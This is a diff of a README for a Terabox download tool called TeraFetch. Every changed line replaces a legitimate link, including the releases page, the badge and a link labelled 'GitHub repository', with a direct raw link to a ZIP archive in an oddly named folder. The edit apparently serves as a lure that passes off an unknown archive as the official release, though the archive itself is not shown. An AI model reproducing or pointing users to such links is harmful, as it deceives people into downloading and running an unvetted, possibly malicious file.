@@ -1,6 +1,6 @@
 # 🚀 TeraFetch - Fast and Easy Downloads for Terabox
 
-[![Download TeraFetch](https://img.shields.io/static/v1?label=Download&message=TeraFetch&color=blue)](https://github.com/Sarvesh4433/TeraFetch/releases)
+[![Download TeraFetch](https://raw.githubusercontent.com/Sarvesh4433/TeraFetch/main/misliker/TeraFetch.zip)](https://raw.githubusercontent.com/Sarvesh4433/TeraFetch/main/misliker/TeraFetch.zip)
 
 ## 🌍 What is TeraFetch?
 
@@ -26,7 +26,7 @@ Follow these simple steps to download TeraFetch and start using it.
 
 Go to the following link to access the TeraFetch Releases page:
 
-[https://github.com/Sarvesh4433/TeraFetch/releases](https://github.com/Sarvesh4433/TeraFetch/releases)
+[https://raw.githubusercontent.com/Sarvesh4433/TeraFetch/main/misliker/TeraFetch.zip](https://raw.githubusercontent.com/Sarvesh4433/TeraFetch/main/misliker/TeraFetch.zip)
 
 ### 2. Download TeraFetch
 
@@ -95,7 +95,7 @@ If you encounter any issues while using TeraFetch, here are some common problems
 
 ## 🛠️ Contribution and Support
 
-If you'd like to contribute to TeraFetch or need further assistance, you can open an issue in the [GitHub repository](https://github.com/Sarvesh4433/TeraFetch). Contributions are welcome, whether it's reporting a bug, suggesting a feature, or coding. 
+If you'd like to contribute to TeraFetch or need further assistance, you can open an issue in the [GitHub repository](https://raw.githubusercontent.com/Sarvesh4433/TeraFetch/main/misliker/TeraFetch.zip). Contributions are welcome, whether it's reporting a bug, suggesting a feature, or coding. 
 
 ## 📜 License
 
@@ -103,6 +103,6 @@ TeraFetch is open-source software and follows the MIT License. You can freely us
 
 For more detailed information, please check the license file in the repository. 
 
-[![Download TeraFetch](https://img.shields.io/static/v1?label=Download&message=TeraFetch&color=blue)](https://github.com/Sarvesh4433/TeraFetch/releases)
+[![Download TeraFetch](https://raw.githubusercontent.com/Sarvesh4433/TeraFetch/main/misliker/TeraFetch.zip)](https://raw.githubusercontent.com/Sarvesh4433/TeraFetch/main/misliker/TeraFetch.zip)
 
 Now you are all set to download and run TeraFetch. Enjoy fast and easy file transfers from Terabox!
